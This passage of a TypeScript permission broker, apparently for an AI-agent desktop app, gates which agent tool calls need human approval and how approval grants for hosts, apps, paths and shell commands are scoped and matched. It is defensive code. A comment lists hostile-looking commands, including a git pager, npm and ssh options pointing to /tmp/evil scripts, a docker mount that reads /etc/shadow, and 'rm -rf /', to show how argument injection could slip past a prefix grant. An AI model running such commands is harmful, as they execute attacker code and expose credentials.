 * to Claude Code's own classifier instead of a Grunt card (spec
 * 2026-10-03-claude-code-auto-mode-design section 3). Only Claude Code tools
 * qualify. A write to Claude Code's own config (see isProtectedAgentPath) and
 * an unrecognised tool (`other`) never do: those are escalation paths and
 * always keep the card.
 */
export function isDeferrableInAutoMode(tool: ToolSpec, args: unknown): boolean {
  if (tool.source !== 'agent') return false;
  if (classifyAgentTool(tool.name).category === 'other') return false;
  return !isProtectedAgentWrite(tool, args);
}

/**
 * Whether a call may run while its reply's plan is still unapproved (spec
 * 2026-10-12-thread-cards-design §2): Grunt's own thread, artifact and
 * recall tools; read-risk fs and MCP tools; and Claude Code's file-read,
 * web and internal tools; and the browser's reads of the page that is already
 * open. Everything else, including any source added later, is refused: the
 * default is false on purpose.
 */
export function allowedWhilePlanning(tool: ToolSpec, args?: unknown): boolean {
  switch (tool.source) {
    // The browser (spec 2026-10-12-model-browser-design): reading the open
    // page (`snapshot`, `scroll`) and closing the browser change nothing. By
    // command name, never by declared risk, as the ask-on-mutate read pass
    // does. Everything that changes a page or sends something to a site is
    // refused: `click`, `type`, `select`, `press`, `back`, and `open` too (a
    // request to an address the model chose, which can carry anything in its
    // query). A call with no command, or one Grunt doesn't know, is refused.
    case 'browser':
      return BROWSER_READ_COMMANDS.has(stringField(args, 'command') ?? '');
    // Computer use (spec 2026-10-12-computer-use-design): every action is
    // refused while planning, the looks (`screenshot`, `cursor_position`,
    // `wait`) included. A look is not like the browser's `snapshot` of a page
    // the model already opened: the first one starts the control session (the
    // shell's native dialog and its indicator), and a screenshot sends
    // whatever is on the screen, any app's window, to the model. Fail closed;
    // the plan can say what it needs to look at.
    case 'computer':
      return false;
    case 'thread':
    case 'artifact':
    case 'recall':
      return true;
    // Starting a sub-agent changes nothing by itself, so a planning reply may
    // send one to look around. This is only safe because the sub-agent's own
    // request carries the same plan gate (SubagentRunner.requestFor): each
    // call it makes comes back through `decide` and is refused here like the
    // parent's would be. Never keep this case without that.
    case 'subagent':
      return true;
    case 'fs':
    case 'mcp':
      return tool.risk === 'read';
    case 'agent': {
      const category = classifyAgentTool(tool.name).category;
      return category === 'file-read' || category === 'web' || category === 'internal';
    }
    default:
      return false;
  }
}

/**
 * A Claude Code file-write call where the workspace-relative `path` (set by the
 * engine's gate, engine-claude-code/src/approval.ts), or any other path key,
 * is Claude Code config.
 * A file-write call with no usable `path` cannot be checked, so it counts as
 * protected too (fail closed: ask, store nothing).
 */
function isProtectedAgentWrite(tool: ToolSpec, args: unknown): boolean {
  if (tool.source !== 'agent' || classifyAgentTool(tool.name).category !== 'file-write') return false;
  const path = stringField(args, 'path');
  if (path === null || isProtectedAgentPath(path)) return true;
  // The normalised `path` is the first path key present; a tool may carry
  // others (`file_path`, `notebook_path`). Any protected one protects the call.
  for (const key of AGENT_PATH_ARG_KEYS) {
    const raw = stringField(args, key);
    if (raw !== null && isProtectedAgentPath(raw)) return true;
  }
  return false;
}

/** A computer-use call on a high-risk app: it gets cards only, never grants. */
function isHighRiskComputerCall(tool: ToolSpec, args: unknown): boolean {
  return tool.source === 'computer' && isHighRiskApp(args);
}

/** The app a computer grant is pinned to: its key, valid as it stands. Throws rather than store a grant for anything else. */
function appForGrant(pending: PendingRequest): string {
  const app = appKey(rawField(pending.args, 'app'));
  if (app === null) {
    throw new Error('Refusing to create a grant for computer use: the approved call named no app Grunt could identify.');
  }
  return app;
}

/**
 * A computer card's line: `Use EXCEL.EXE: click at 512, 300`. The name is the
 * file name in the app's key (`describeApp`), the same key a grant would be
 * pinned to and the shell checks before acting; a name the call carries
 * (`appName`) or a window title is never used. The rest holds validated
 * values only, and never typed text (`actionSummary`).
 */
function computerSummary(args: unknown): string {
  const name = describeApp(rawField(args, 'app'))?.name;
  return `Use ${name === undefined ? '?' : cardLine(name, 80)}: ${actionSummary(args)}`;
}

function checkPolicy(tool: ToolSpec, policy: ToolPolicy): string | null {
  switch (tool.source) {
    case 'fs':
      if (policy.fs === 'off') return 'Filesystem tools are disabled by policy.';
      if (tool.risk === 'mutate' && policy.fs !== 'readwrite') {
        return `"${tool.name}" mutates the filesystem, but policy only permits read access.`;
      }
      return null;
    case 'shell':
      if (!policy.shell) return 'Shell execution is disabled by policy.';
      if (policy.shellRuns === 'sandbox') return 'This profile runs shell commands in the sandbox, not on this machine.';
      return null;
    case 'sandbox':
    case 'network':
      return runsShellInSandbox(policy) ? null : "This profile doesn't run shell commands in the sandbox.";
    case 'mcp': {
      if (policy.mcpServerIds.length === 0) return 'No MCP servers are enabled by policy.';
      // "Some server is enabled" is not "THIS tool's server is enabled".
      // Checking only the former meant a tool from a server the user had
      // never enabled was allowed the moment any other server was -- and
      // read-risk MCP tools then took the auto-approval shortcut below on
      // the strength of that same non-check. A tool that does not say where
      // it came from cannot be checked at all, so it is denied rather than
      // given the benefit of the doubt.
      if (!tool.serverId) {
        return `"${tool.name}" does not declare which MCP server it came from, so it cannot be checked against the enabled-server list.`;
      }
      if (!policy.mcpServerIds.includes(tool.serverId)) {
        return `"${tool.name}" comes from MCP server "${tool.serverId}", which this profile does not enable.`;
      }
      return null;
    }
    case 'agent':
      return agentPolicyDenial(tool.name, policy);
    case 'artifact':
      return policy.artifacts === false ? 'Artifacts are turned off for this profile.' : null;
    case 'recall':
      return policy.recall === false ? 'Searching past chats is turned off for this profile.' : null;
    case 'thread':
      return null;
    case 'subagent':
      return policy.subagents === true ? null : 'Sub-agents are turned off for this profile.';
    case 'browser':
      return policy.browser === true ? null : 'The browser is turned off for this profile.';
    case 'computer':
      return policy.computer === true ? null : COMPUTER_OFF_REASON;
    default: {
      const exhaustive: never = tool.source;
      return `Unknown tool source: ${String(exhaustive)}`;
    }
  }
}

type ConstraintKey = 'pathPrefix' | 'commandPrefix' | 'commandExact' | 'host' | 'app';
const CONSTRAINT_KEYS: readonly ConstraintKey[] = ['pathPrefix', 'commandPrefix', 'commandExact', 'host', 'app'];

/**
 * The keys a constraint actually sets. A key holding `undefined` is absent
 * (the server's parser spells "not given" that way). Returns `null` when the
 * constraint carries a key Grunt doesn't know: such a grant can't be read,
 * so it neither matches nor gets stored.
 */
function constraintKeys(constraint: object): ConstraintKey[] | null {
  const keys: ConstraintKey[] = [];
  for (const [key, value] of Object.entries(constraint)) {
    if (value === undefined) continue;
    if (!(CONSTRAINT_KEYS as readonly string[]).includes(key)) return null;
    keys.push(key as ConstraintKey);
  }
  return keys;
}

/**
 * Whether a stored grant's constraint covers this call. EVERY key the
 * constraint sets must match (an earlier version stopped at the first key it
 * found, so `{commandExact: 'ls', pathPrefix: '.'}` matched any command with
 * an in-workspace `path`). A `host` key matches only a network or browser
 * call, and such a call needs one; an `app` key matches only a computer call,
 * and such a call needs exactly `{ app }` and nothing else; a shell call
 * needs a command key. A grant with no constraint never covers a shell,
 * network, browser or computer call, and one with no key Grunt knows covers
 * nothing. A key whose stored value isn't a string never matches (and never
 * throws).
 *
 * The grant's source is part of the match: `findMatchingGrant` already skips
 * a grant of another source, and this refuses one again, so a host grant made
 * for the browser can never cover the sandbox's network, or the other way
 * round, whatever host they share, and an app grant covers nothing but
 * computer use.
 */
function grantConstraintMatches(grant: Grant, tool: ToolSpec, args: unknown, ctx: ToolContext): boolean {
  const shell = isShellTool(tool);
  const hostKeyed = isHostKeyed(tool.source);
  const computer = tool.source === 'computer';
  if ((hostKeyed || computer) && grant.source !== tool.source) return false;
  const constraint = grant.constraint;
  if (!constraint) return !shell && !hostKeyed && !computer;
  // A live grant is for one live call (decideLive), never an ordinary one.
  // (constraintKeys would refuse the unknown key anyway; this says so.)
  if (constraint.live !== undefined) return false;
  const keys = constraintKeys(constraint);
  if (keys === null || keys.length === 0) return false;
  if (hostKeyed !== keys.includes('host')) return false;
  if (computer !== keys.includes('app')) return false;
  // A host-keyed grant is one host and nothing else, `{ host }`, and a
  // computer grant one app and nothing else, `{ app }` (ruling C4): a second
  // key a call could satisfy on its own (`{ host, commandExact: 'open' }`)
  // makes it no grant at all, whatever the first key says.
  if ((hostKeyed || computer) && keys.length !== 1) return false;
  if (shell && !keys.includes('commandExact') && !keys.includes('commandPrefix')) return false;
  return keys.every((key) => constraintKeyMatches(key, constraint[key], tool, args, ctx));
}

function constraintKeyMatches(key: ConstraintKey, wanted: unknown, tool: ToolSpec, args: unknown, ctx: ToolContext): boolean {
  if (key === 'app') {
    // Exact on the app's key: both sides must be valid keys as they stand
    // (`appKey` checks, it never repairs or folds) and the same string. No
    // prefix, case, short-name or separator matching: the shell canonicalises.
    const want = appKey(wanted);
    const got = appKey(rawField(args, 'app'));
    return want !== null && got !== null && want === got;
  }
  if (key === 'host') {
    // Exact on the canonical host (so case, a trailing dot, an IDN or an IP
    // spelling can't differ): a grant never covers a subdomain. hostOfCall is
    // null for a non-string, so a corrupt row can't throw here.
    const granted = hostOfCall(tool.source, wanted);
    return granted !== null && granted === hostOfCall(tool.source, stringField(args, 'host'));
  }
  if (typeof wanted !== 'string') return false;
  if (key === 'pathPrefix') {
    const path = stringField(args, 'path');
    if (path === null) return false;
    // BOTH sides are resolved through the same gate the tool will use, so
    // the grant is evaluated against the file the call will actually touch.
    // A resolution failure (escapes the workspace, no workspace configured,
    // unreadable ancestor) means "cannot confirm this is inside the grant"
    // and therefore no match -- fail closed, ask the human.
    const candidate = resolveForGrantMatch(ctx, path);
    const prefix = resolveForGrantMatch(ctx, wanted);
    return candidate !== null && prefix !== null && pathPrefixMatches(prefix, candidate);
  }
  const command = stringField(args, 'command');
  if (command === null) return false;
  return key === 'commandExact' ? command.trim() === wanted.trim() : commandPrefixMatches(wanted, command);
}

/**
 * The constraint an `'always'` answer is stored with, derived from what the
 * client sent and checked against the pending card's tool; throws (and so
 * stores nothing) for anything else. Never the client's object as sent:
 *
 *   - the network and the browser: exactly `{host}`, naming the card's OWN
 *     host in any spelling, stored canonical -- answering a `pypi.org` card
 *     with `{host: 'evil.com'}` must not mint a grant for evil.com, and a
 *     browser card's "always" covers the site the person was shown and no
 *     other;
 *   - a shell tool (`isShellTool`, which covers the sandboxed `run_command`):
 *     exactly one of `commandExact`/`commandPrefix`, non-empty, trimmed;
 *   - computer use: exactly `{app}`, the card's own app key as it stands
 *     (ruling C4 of the computer-use track) -- never another app, never a
 *     second key, never blanket;
 *   - anything else: a `pathPrefix`, or nothing (an unconstrained grant, as
 *     before). No `host`, `app` or command keys.
 */
function alwaysConstraintFor(pending: PendingRequest, sent: Grant['constraint']): Grant['constraint'] {
  const tool = pending.tool;
  const keys = sent === null || sent === undefined ? [] : constraintKeys(sent);
  if (keys === null) {
    throw new Error(`Refusing to create an "always" grant for "${tool.name}": its constraint has a key Grunt doesn't know.`);
  }
  const value = (key: ConstraintKey): string => {
    const v = sent?.[key];
    if (typeof v !== 'string' || v.trim() === '') {
      throw new Error(`Refusing to create an "always" grant for "${tool.name}": constraint.${key} must be a non-empty string.`);
    }
    return v.trim();
  };

  if (isHostKeyed(tool.source)) {
    const what = tool.source === 'browser' ? 'the browser' : 'the sandbox network';
    const own = hostForGrant(pending);
    if (keys.length !== 1 || keys[0] !== 'host') {
      throw new Error(`Refusing to create an "always" grant for ${what} that does not name exactly one host, the card's own (${own}), and nothing else.`);
    }
    if (hostOfCall(tool.source, value('host')) !== own) {
      throw new Error(`Refusing to create an "always" grant for ${what}: it must name the card's own host (${own}).`);
    }
    return { host: own };
  }

  if (isShellTool(tool)) {
    const command = keys.filter((k) => k === 'commandExact' || k === 'commandPrefix');
    if (command.length === 0) {
      throw new Error(
        `Refusing to create an unconstrained "always" grant for shell tool "${tool.name}": ` +
          'every always-scope grant for a shell tool must carry a commandPrefix or commandExact constraint.'
      );
    }
    const [key] = command;
    if (keys.length !== 1 || key === undefined) {
      throw new Error(
        `Refusing to create an "always" grant for shell tool "${tool.name}": it may carry exactly one of commandExact or commandPrefix, and nothing else.`
      );
    }
    return key === 'commandExact' ? { commandExact: value(key) } : { commandPrefix: value(key) };
  }

  if (tool.source === 'computer') {
    // The one app the card named, by its key exactly as the tool's
    // describeCall worked it out: another spelling of the same path is
    // another key, and one that isn't a valid key is none.
    const own = appForGrant(pending);
    if (sent?.app === undefined) {
      throw new Error('Refusing to create an unconstrained "always" grant for computer use: it must name the app (constraint.app).');
    }
    if (keys.length !== 1 || keys[0] !== 'app') {
      throw new Error(`Refusing to create an "always" grant for computer use that names anything but the card's own app (${own}).`);
    }
    if (appKey(sent.app) !== own) {
      throw new Error(`Refusing an "always" grant for computer use that doesn't name the app the card asked about (${own}).`);
    }
    return { app: own };
  }

  if (keys.some((k) => k !== 'pathPrefix')) {
    throw new Error(`Refusing to create an "always" grant for "${tool.name}": only a pathPrefix constraint applies to it.`);
  }
  if (keys.length === 0) {
    // An object setting no keys is malformed rather than a request for a
    // blanket grant: before this check it was stored and matched nothing.
    if (sent !== null && sent !== undefined) {
      throw new Error(`Refusing to create an "always" grant for "${tool.name}": its constraint sets no keys.`);
    }
    return null;
  }
  // As sent (existing behaviour): a path is resolved through containPath when matched.
  const pathPrefix = sent?.pathPrefix;
  if (typeof pathPrefix !== 'string') {
    throw new Error(`Refusing to create an "always" grant for "${tool.name}": constraint.pathPrefix must be a string.`);
  }
  return { pathPrefix };
}

/**
 * Resolves a grant-matching path candidate exactly the way the fs tool that
 * would run next resolves it -- `containPath`, the single containment gate
 * -- and returns `null` if it will not resolve to something inside the
 * workspace.
 *
 * This is the fix for a real escape, not defensive tidying: matching the raw
 * argument string meant a grant scoped to `/ws/src` authorised
 * `write_file("/ws/src/../secret.env")`. `containPath` could not catch it
 * either -- that path resolves *inside* the workspace, so containment was
 * satisfied and the write went through. The grant said "only under
 * /ws/src"; the effective permission was "anywhere in the workspace".
 * Resolving here removes the disagreement: the string the grant is compared
 * against and the file the tool opens are the same thing.
 */
function resolveForGrantMatch(ctx: ToolContext, candidate: string): string | null {
  try {
    // containPathIn, as the fs tools now resolve: the workspace or one of the
    // chat's extra folders (spec 2026-10-07-extra-folders).
    return containPathIn(ctx.workspaceRoot, ctx.folders ?? [], candidate).path;
  } catch {
    return null;
  }
}

/** Whether `path` resolves into one of the chat's read-only extra folders. False when it resolves nowhere. */
function inReadOnlyFolder(ctx: ToolContext, path: string): boolean {
  if (!ctx.folders || ctx.folders.length === 0) return false;
  try {
    return !containPathIn(ctx.workspaceRoot, ctx.folders, path).writable;
  } catch {
    return false;
  }
}

/**
 * Path-prefix matching by path SEGMENT, not by raw string prefix: a grant
 * on `/ws/src` must not authorise `/ws/src-secret/f` merely because the
 * text "/ws/src" is a character-for-character prefix of it. A match
 * requires exact equality, or the candidate continuing right after a path
 * separator boundary.
 *
 * Both arguments are expected to have been through `resolveForGrantMatch`
 * already (so `..`, `.`, mixed separators and symlinks are gone before the
 * comparison); the normalisation below is belt-and-braces for callers that
 * hand over an already-absolute platform path.
 */
function pathPrefixMatches(prefix: string, candidate: string): boolean {
  const normalizedPrefix = stripTrailingSep(normalizeSeparators(prefix));
  const normalizedCandidate = normalizeSeparators(candidate);
  return normalizedCandidate === normalizedPrefix || normalizedCandidate.startsWith(normalizedPrefix + sep);
}

function normalizeSeparators(p: string): string {
  return p.split(/[\\/]+/).join(sep);
}

function stripTrailingSep(p: string): string {
  return p.length > 1 && p.endsWith(sep) ? p.slice(0, -1) : p;
}

/**
 * Command-prefix matching by ARGV prefix, not by raw string prefix: a grant
 * on "npm test" must not authorise "npm test && rm -rf /" merely because
 * the text "npm test" is a character-for-character prefix of it. A match
 * requires exact equality, or the prefix followed by a whitespace boundary
 * (so "npm testing" is rejected, not just "npm test-evil") AND the absence
 * of any shell metacharacter anywhere in the command.
 *
 * What that DOES buy: no chaining, piping, command substitution, or
 * redirection can be appended to an approved prefix, so the grant cannot be
 * turned into "run a second, different program".
 *
 * What it does NOT buy, stated plainly because an earlier version of this
 * comment claimed otherwise ("authorises exactly that command plus plain
 * trailing arguments, never additional shell-interpreted syntax", as though
 * plain trailing arguments were harmless): for a great many programs,
 * *arguments alone* are arbitrary code execution, with no metacharacter
 * anywhere in sight. All of these match a `commandPrefix` grant and all of
 * them run attacker code:
 *
 *     npm test --node-options=--require=/tmp/evil.js
 *     git -c core.pager=/tmp/evil.sh log
 *     docker run -v /:/host alpine cat /host/etc/shadow
 *     ssh -o ProxyCommand=/tmp/evil.sh host
 *
 * A `commandPrefix` grant is therefore best understood as "this program,
 * with whatever arguments it likes" -- which is a meaningful restriction
 * only for programs whose argument surface is itself safe, and the broker
 * has no way to know which those are. `commandExact` exists for callers that
 * want the strictly stronger thing, and is what a `chat`-scope shell
 * approval is stored as; `commandPrefix` remains available for `always`
 * grants because a human explicitly typed the prefix they wanted, but the UI
 * should present it as the broad permission it is.
 */
function commandPrefixMatches(prefix: string, command: string): boolean {
  const trimmedPrefix = prefix.trim();
  const trimmedCommand = command.trim();
  if (trimmedCommand === trimmedPrefix) return true;
  if (!trimmedCommand.startsWith(trimmedPrefix)) return false;
  if (!/^\s/.test(trimmedCommand.slice(trimmedPrefix.length))) return false;
  return !SHELL_METACHARACTERS.test(trimmedCommand);
}

const SHELL_METACHARACTERS = /[&|;`$<>\n\r]/;

/**
 * The exact command string a `'chat'`-scope shell grant is pinned to.
 *
 * Throws rather than falling back to an unconstrained grant if the pending
 * call had no usable `command` argument: "we could not work out what was
 * approved" must never resolve to "approve everything" for a tool with no
 * containment of its own. The caller (`resolve()`) lets this propagate, so
 * the grant is simply not created and the next call asks again.
 */
function exactCommandForGrant(pending: PendingRequest): string {
  const command = stringField(pending.args, 'command');
  if (command === null || command.trim() === '') {
    throw new Error(
      `Refusing to create a "chat"-scope grant for shell tool "${pending.tool.name}": the approved call carried ` +
        'no "command" string to pin the grant to, and a shell grant must never be unconstrained.'
    );
  }
  return command.trim();
}

/** The sources whose grants are pinned to one `host`: the sandbox's network and the browser. */
function isHostKeyed(source: ToolSource): source is 'network' | 'browser' {
  return source === 'network' || source === 'browser';
}

/**
 * The canonical host a call or a grant names, or null when it names none.
 * One spelling per host for both host-keyed sources, so a grant and a call
 * are always compared like for like. `canonicalHost` (the sandbox) is built on
 * `normaliseHost` (the browser) and so agrees with it on every host both
 * accept; the sandbox takes fewer: it has no IPv6 literals, which a website
 * may be.
 */
function hostOfCall(source: ToolSource, raw: unknown): string | null {
  if (source === 'browser') return typeof raw === 'string' ? normaliseHost(raw) : null;
  return canonicalHost(raw);
}

/** The canonical host a network or browser grant is pinned to. Throws when the call named none, so no unpinned grant is ever stored. */
function hostForGrant(pending: PendingRequest): string {
  const host = hostOfCall(pending.tool.source, stringField(pending.args, 'host'));
  if (host === null) {
    throw new Error(
      pending.tool.source === 'browser'
        ? 'Refusing to create a grant for the browser: the approved call named no website to pin it to.'
        : 'Refusing to create a grant for the sandbox network: the approved call named no valid host.'
    );
  }
  return host;
}

/**
 * Why a network call is refused outright, or null when it may go on to the
 * grants and a card: its host has no canonical spelling, or is this machine
 * or a private, link-local or CGNAT address.
 */
function networkHostRefusal(args: unknown): string | null {
  const raw = typeof args === 'object' && args !== null ? (args as Record<string, unknown>)['host'] : undefined;
  const host = canonicalHost(raw);
  if (host === null) return `The sandbox can't reach ${JSON.stringify(raw ?? null)}: it isn't a valid host name.`;
  if (isLocalOrPrivateHost(host)) return `The sandbox can't reach ${host}: it's this machine or a private network address.`;
  return null;
}

/** A network card's summary: the canonical host, and its port when known. */
function networkSummary(args: unknown): string {
  const host = canonicalHost(stringField(args, 'host')) ?? '?';
  const port = typeof args === 'object' && args !== null ? (args as Record<string, unknown>)['port'] : undefined;
  return `sandbox_network: ${host}${typeof port === 'number' ? `:${port}` : ''}`;
}

/** A browser card's line: `Use <host>: <what the call does>`. */
function browserSummary(args: unknown): string {
  const host = stringField(args, 'host') ?? '?';
  const ref = stringField(args, 'ref');
  const target = stringField(args, 'target');
  const on = ref !== null ? ` ${ref}${target !== null ? ` (${target})` : ''}` : '';
  const record = (typeof args === 'object' && args !== null ? args : {}) as Record<string, unknown>;
  switch (stringField(args, 'command')) {
    case 'open':
      return `Use ${host}: open ${stringField(args, 'url') ?? ''}`;
    case 'click':
      return `Use ${host}: ${record['double'] === true ? 'double-click' : 'click'}${on}`;
    case 'type':
      return `Use ${host}: type into${on}`;
    case 'select': {
      const values = Array.isArray(record['values']) ? record['values'].filter((v): v is string => typeof v === 'string').join(', ') : '';
      return `Use ${host}: choose ${values} in${on}`;
    }
    case 'press':
      return `Use ${host}: press ${stringField(args, 'key') ?? ''}`;
    case 'scroll':
      return `Use ${host}: scroll ${stringField(args, 'direction') ?? 'down'}${ref !== null ? ` to${on}` : ''}`;
    case 'back':
      return `Use ${host}: go back`;
    case 'snapshot':
      return `Use ${host}: read the page`;
    case 'close':
      return `Use ${host}: close the browser`;
    default:
      return `Use ${host}: ${stringField(args, 'command') ?? '?'}`;
  }
}

/** `args[key]` whatever it is, for a validator that takes `unknown` (`appKey`). */
function rawField(args: unknown, key: string): unknown {
  return typeof args === 'object' && args !== null ? (args as Record<string, unknown>)[key] : undefined;
}

function stringField(args: unknown, key: string): string | null {
  if (typeof args !== 'object' || args === null) return null;
  const value = (args as Record<string, unknown>)[key];
  return typeof value === 'string' ? value : null;
}

function summarize(tool: ToolSpec, args: unknown): string {
  const path = stringField(args, 'path');
  if (path !== null) return `${tool.name}(${path})`;
  const command = stringField(args, 'command');
  if (command !== null) return `${tool.name}: ${command}`;
  return tool.name;
}
